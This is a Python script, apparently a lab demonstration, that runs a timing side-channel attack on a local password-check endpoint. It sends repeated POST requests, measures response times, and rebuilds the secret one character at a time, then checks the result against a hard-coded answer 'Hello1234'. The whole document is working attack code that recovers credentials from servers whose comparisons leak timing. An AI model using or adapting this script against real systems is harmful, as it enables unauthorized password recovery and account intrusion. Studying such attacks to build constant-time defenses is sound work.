import time
import string
import requests

characters = string.ascii_letters + string.digits + string.punctuation

url = "http://127.0.0.1:5000/check"

known = ""
sample = 5
secret_length = 9

for position in range(secret_length):

    best_char = ""
    longest_time = 0

    for char in characters:

        remaining = secret_length - len(known) - 1
        guess = known + char + "X" * remaining

        measurements = []

        for _ in range(sample):

            start = time.perf_counter()

            response = requests.post(
                url,
                json={"password": guess}
            )

            end = time.perf_counter()

            measurements.append(end - start)

        average_time = sum(measurements) / len(measurements)

        if average_time > longest_time:
            longest_time = average_time
            best_char = char

    known += best_char

    print("Recovered so far:", known)

print()
print("Final candidate:", known)
print("Expected secret: Hello1234")
print("Attack successful:", known == "Hello1234")